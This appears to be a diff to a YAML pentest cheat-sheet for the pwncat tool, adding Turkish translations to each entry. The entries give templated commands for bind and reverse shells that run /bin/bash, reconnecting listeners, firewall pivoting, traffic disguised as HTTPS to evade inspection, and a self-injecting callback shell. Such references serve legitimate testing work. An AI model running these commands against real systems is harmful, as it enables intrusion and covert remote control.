@@ -3,108 +3,205 @@ tags: [network, connectivity, scanning, pentest, reverse-shell, pivoting, firewa
 
 actions:
 # === BASIC MODES (LISTEN & CONNECT) ===
- - title: pwncat - basic tcp listener
-   desc: |
-     Starts a standard TCP listener on a specified port. This is the primary way 
-     to wait for incoming connections from a remote host. By default, the 
-     server will terminate once the client disconnects or the session ends.
+ - title:
+     en: pwncat - basic tcp listener
+     tr: pwncat - temel TCP dinleyici
+   desc:
+     en: |
+       Starts a standard TCP listener on a specified port. This is the primary way 
+       to wait for incoming connections from a remote host. By default, the 
+       server will terminate once the client disconnects or the session ends.
+     tr: |
+       Belirtilen bir portta standart bir TCP dinleyici başlatır. Uzak bir makineden
+       gelen bağlantıları beklemenin birincil yoludur. Varsayılan olarak sunucu,
+       istemci bağlantıyı kestiğinde veya oturum sona erdiğinde sonlanır.
    command: "pwncat -l {{port|4444}}"
 
- - title: pwncat - basic tcp client connection
-   desc: |
-     Initiates a TCP connection to a remote host and port. This is used to connect 
-     to a listening service or a bind shell on a target machine. It acts as a 
-     standard network client similar to netcat.
+ - title:
+     en: pwncat - basic tcp client connection
+     tr: pwncat - temel TCP istemci bağlantısı
+   desc:
+     en: |
+       Initiates a TCP connection to a remote host and port. This is used to connect 
+       to a listening service or a bind shell on a target machine. It acts as a 
+       standard network client similar to netcat.
+     tr: |
+       Uzak bir makineye ve porta TCP bağlantısı başlatır. Dinleyen bir hizmete veya
+       hedef makinedeki bir bind shell'e bağlanmak için kullanılır. netcat benzeri
+       standart bir ağ istemcisi gibi davranır.
    command: "pwncat {{hostname}} {{port|4444}}"
 
- - title: pwncat - bind shell listener
-   desc: |
-     Starts a listener and executes a shell command when a client connects. 
-     This effectively creates a bind shell on the machine where this command is run. 
-     Use this with caution as it provides remote access to the system's command line.
+ - title:
+     en: pwncat - bind shell listener
+     tr: pwncat - bind shell dinleyici
+   desc:
+     en: |
+       Starts a listener and executes a shell command when a client connects. 
+       This effectively creates a bind shell on the machine where this command is run. 
+       Use this with caution as it provides remote access to the system's command line.
+     tr: |
+       Bir dinleyici başlatır ve bir istemci bağlandığında bir kabuk komutu çalıştırır.
+       Bu, komutun çalıştırıldığı makinede etkili biçimde bir bind shell oluşturur.
+       Sistemin komut satırına uzaktan erişim sağladığı için dikkatle kullanın.
    command: "pwncat -l {{port|4444}} -e {{shell|/bin/bash}}"
 
 # === PERSISTENCE & RELIABILITY ===
- - title: pwncat - persistent listener (keep-open)
-   desc: |
-     Starts a TCP listener that stays open and accepts new connections even 
-     after a client disconnects. The -k or --keep-open flag prevents the 
-     process from exiting when the first session is closed. This is essential 
-     for maintaining a steady entry point during a penetration test.
+ - title:
+     en: pwncat - persistent listener (keep-open)
+     tr: pwncat - kalıcı dinleyici (açık tutma)
+   desc:
+     en: |
+       Starts a TCP listener that stays open and accepts new connections even 
+       after a client disconnects. The -k or --keep-open flag prevents the 
+       process from exiting when the first session is closed. This is essential 
+       for maintaining a steady entry point during a penetration test.
+     tr: |
+       Bir istemci bağlantıyı kestikten sonra bile açık kalıp yeni bağlantıları kabul eden
+       bir TCP dinleyici başlatır. -k veya --keep-open bayrağı, ilk oturum kapatıldığında
+       işlemin sonlanmasını engeller. Sızma testi sırasında istikrarlı bir giriş noktası
+       korumak için vazgeçilmezdir.
    command: "pwncat -l -k {{port|4444}}"
 
- - title: pwncat - automatic client reconnection
-   desc: |
-     Attempts to connect to a remote host and automatically retries if the 
-     connection is refused or dropped. The --reconn flag can be followed by 
-     a number for specific retries or left empty for infinite attempts. 
-     This ensures a reverse shell remains active through network instability.
+ - title:
+     en: pwncat - automatic client reconnection
+     tr: pwncat - otomatik istemci yeniden bağlanma
+   desc:
+     en: |
+       Attempts to connect to a remote host and automatically retries if the 
+       connection is refused or dropped. The --reconn flag can be followed by 
+       a number for specific retries or left empty for infinite attempts. 
+       This ensures a reverse shell remains active through network instability.
+     tr: |
+       Uzak bir makineye bağlanmayı dener ve bağlantı reddedilirse veya koparsa
+       otomatik olarak yeniden dener. --reconn bayrağının ardından belirli sayıda
+       deneme verilebilir veya sonsuz deneme için boş bırakılabilir.
+       Bu, ağ dalgalanmalarında ters kabuğun (reverse shell) etkin kalmasını sağlar.
    command: "pwncat {{hostname}} {{port|4444}} --reconn --reconn-wait {{seconds|5}}"
 
- - title: pwncat - listener with rebind on failure
-   desc: |
-     Instructs the server to attempt to re-bind to the port if the initial 
-     attempt fails. This is useful in scenarios where a port might be 
-     temporarily locked by the OS or another process. You can specify 
-     how many times to retry before the tool gives up.
+ - title:
+     en: pwncat - listener with rebind on failure
+     tr: pwncat - hatada yeniden bağlanan dinleyici
+   desc:
+     en: |
+       Instructs the server to attempt to re-bind to the port if the initial 
+       attempt fails. This is useful in scenarios where a port might be 
+       temporarily locked by the OS or another process. You can specify 
+       how many times to retry before the tool gives up.
+     tr: |
+       İlk deneme başarısız olursa sunucuya porta yeniden bağlanmayı denemesini söyler.
+       Portun işletim sistemi veya başka bir işlem tarafından geçici olarak kilitlendiği
+       durumlarda kullanışlıdır. Araç vazgeçmeden önce kaç kez yeniden deneyeceğini belirtebilirsiniz.
    command: "pwncat -l {{port|4444}} --rebind {{retry_count|10}} --rebind-wait {{seconds|2}}"
 
 # === PORT SCANNING (ZERO-I/O) ===
- - title: pwncat - port scanning with banner grabbing
-   desc: |
-     Scans a range of ports on a target host using Zero-I/O mode. The --banner 
-     flag attempts to capture the service banner for version detection. 
-     You can specify port ranges using hyphens or lists using commas 
-     to quickly identify open services.
+ - title:
+     en: pwncat - port scanning with banner grabbing
+     tr: pwncat - banner yakalamalı port tarama
+   desc:
+     en: |
+       Scans a range of ports on a target host using Zero-I/O mode. The --banner 
+       flag attempts to capture the service banner for version detection. 
+       You can specify port ranges using hyphens or lists using commas 
+       to quickly identify open services.
+     tr: |
+       Sıfır-G/Ç (Zero-I/O) moduyla hedef makinedeki bir port aralığını tarar. --banner
+       bayrağı sürüm tespiti için hizmet başlığını (banner) yakalamaya çalışır.
+       Açık hizmetleri hızla belirlemek için port aralıklarını tireyle, listeleri virgülle belirtebilirsiniz.
    command: "pwncat -z {{hostname}} {{port_range|1-1024}} --banner"
 
 # === PORT FORWARDING & PIVOTING ===
- - title: pwncat - local port forwarding
-   desc: |
-     Maps a local port to a remote service through an internal pwncat proxy. 
-     This allows you to access services on a remote network that are 
-     otherwise blocked by firewalls. Traffic sent to the local port 
-     is tunneled directly to the specified destination.
+ - title:
+     en: pwncat - local port forwarding
+     tr: pwncat - yerel port yönlendirme
+   desc:
+     en: |
+       Maps a local port to a remote service through an internal pwncat proxy. 
+       This allows you to access services on a remote network that are 
+       otherwise blocked by firewalls. Traffic sent to the local port 
+       is tunneled directly to the specified destination.
+     tr: |
+       Dahili bir pwncat vekil sunucusu üzerinden yerel bir portu uzak bir hizmete eşler.
+       Böylece güvenlik duvarlarınca engellenen uzak ağdaki hizmetlere erişebilirsiniz.
+       Yerel porta gönderilen trafik doğrudan belirtilen hedefe tünellenir.
    command: "pwncat -L {{local_addr|127.0.0.1}}:{{local_port|8080}} {{remote_host}} {{remote_port|80}}"
 
- - title: pwncat - remote port forwarding
-   desc: |
-     Establishes two internal clients to proxy traffic between a target and 
-     a remote pwncat server. This mode is ideal for bypassing strict 
-     inbound firewall rules by initiating an outbound connection. It 
-     effectively pushes access to an internal service out to your listener.
+ - title:
+     en: pwncat - remote port forwarding
+     tr: pwncat - uzak port yönlendirme
+   desc:
+     en: |
+       Establishes two internal clients to proxy traffic between a target and 
+       a remote pwncat server. This mode is ideal for bypassing strict 
+       inbound firewall rules by initiating an outbound connection. It 
+       effectively pushes access to an internal service out to your listener.
+     tr: |
+       Hedef ile uzak bir pwncat sunucusu arasında trafiğe vekillik etmek için iki dahili istemci kurar.
+       Giden bir bağlantı başlatarak katı gelen (inbound) güvenlik duvarı kurallarını atlatmak için idealdir.
+       İç bir hizmete erişimi etkili biçimde sizin dinleyicinize taşır.
    command: "pwncat -R {{remote_listener_ip}}:{{remote_listener_port}} {{target_host}} {{target_port}}"
 
 # === EVASION & ADVANCED PROTOCOLS ===
- - title: pwncat - traffic masking with http/https
-   desc: |
-     Wraps the communication in HTTP or HTTPS packets to evade Deep Packet 
-     Inspection (DPI) and firewall filters. This makes the connection 
-     appear as legitimate web traffic to security monitoring tools. 
-     Custom headers can be added to further mimic real browser requests.
+ - title:
+     en: pwncat - traffic masking with http/https
+     tr: pwncat - HTTP/HTTPS ile trafik gizleme
+   desc:
+     en: |
+       Wraps the communication in HTTP or HTTPS packets to evade Deep Packet 
+       Inspection (DPI) and firewall filters. This makes the connection 
+       appear as legitimate web traffic to security monitoring tools. 
+       Custom headers can be added to further mimic real browser requests.
+     tr: |
+       Derin Paket İncelemesini (DPI) ve güvenlik duvarı filtrelerini atlatmak için
+       iletişimi HTTP veya HTTPS paketlerine sarar. Böylece bağlantı, güvenlik izleme
+       araçlarına meşru web trafiği gibi görünür.
+       Gerçek tarayıcı isteklerini daha iyi taklit etmek için özel başlıklar eklenebilir.
    command: "pwncat --{{protocol|https}} --header \"User-Agent: Mozilla/5.0\" {{hostname}} {{port|443}}"
 
- - title: pwncat - udp reverse shell with ping init
-   desc: |
-     Creates a reverse shell over the UDP protocol, which is stateless. 
-     The --ping-init flag is required so the listener can discover the 
-     client's IP address and start communicating. This is useful for 
-     environments where TCP traffic is heavily monitored or restricted.
+ - title:
+     en: pwncat - udp reverse shell with ping init
+     tr: pwncat - ping init ile UDP ters kabuk
+   desc:
+     en: |
+       Creates a reverse shell over the UDP protocol, which is stateless. 
+       The --ping-init flag is required so the listener can discover the 
+       client's IP address and start communicating. This is useful for 
+       environments where TCP traffic is heavily monitored or restricted.
+     tr: |
+       Durumsuz (stateless) olan UDP protokolü üzerinden ters kabuk oluşturur.
+       Dinleyicinin istemcinin IP adresini bulup iletişime başlayabilmesi için
+       --ping-init bayrağı gereklidir. TCP trafiğinin yoğun izlendiği veya
+       kısıtlandığı ortamlarda kullanışlıdır.
    command: "pwncat {{hostname}} {{port|4444}} -u --ping-init --ping-intvl {{seconds|10}} -e {{shell|/bin/bash}}"
 
- - title: pwncat - outbound port probing (port robin)
-   desc: |
-     Attempts to connect to a list of ports in a round-robin fashion to 
-     identify which outbound ports are permitted by a firewall. This 
-     is combined with the --reconn-robin flag to cycle through 
-     different destination ports until a connection is successful.
+ - title:
+     en: pwncat - outbound port probing (port robin)
+     tr: pwncat - giden port yoklama (port robin)
+   desc:
+     en: |
+       Attempts to connect to a list of ports in a round-robin fashion to 
+       identify which outbound ports are permitted by a firewall. This 
+       is combined with the --reconn-robin flag to cycle through 
+       different destination ports until a connection is successful.
+     tr: |
+       Güvenlik duvarının hangi giden portlara izin verdiğini belirlemek için bir port
+       listesine dönüşümlü (round-robin) biçimde bağlanmayı dener.
+       Bağlantı başarılı olana dek farklı hedef portlar arasında dönmek için
+       --reconn-robin bayrağıyla birlikte kullanılır.
    command: "pwncat {{hostname}} {{port|4444}} --reconn --reconn-robin {{port_list|80,443,53,8080}}"
 
- - title: pwncat - automatic self-injection (experimental)
-   desc: |
-     Automatically deploys a persistent pwncat reverse shell once a 
-     connection is received. This replaces a simple shell (like bash) 
-     with a fully featured pwncat instance that connects back to 
-     your specified address. This is currently an experimental feature 
-     limited to Linux remote hosts.
+ - title:
+     en: pwncat - automatic self-injection (experimental)
+     tr: pwncat - otomatik kendi kendine enjeksiyon (deneysel)
+   desc:
+     en: |
+       Automatically deploys a persistent pwncat reverse shell once a 
+       connection is received. This replaces a simple shell (like bash) 
+       with a fully featured pwncat instance that connects back to 
+       your specified address. This is currently an experimental feature 
+       limited to Linux remote hosts.
+     tr: |
+       Bağlantı alındığında kalıcı bir pwncat ters kabuğunu otomatik dağıtır.
+       Bu, basit bir kabuğu (bash gibi) belirttiğiniz adrese geri bağlanan
+       tam donanımlı bir pwncat örneğiyle değiştirir. Bu şu anda yalnızca
+       Linux uzak makinelerle sınırlı deneysel bir özelliktir.
    command: "pwncat -l {{port|4444}} --self-inject {{shell|/bin/bash}}:{{callback_ip}}:{{callback_port|4445}}"
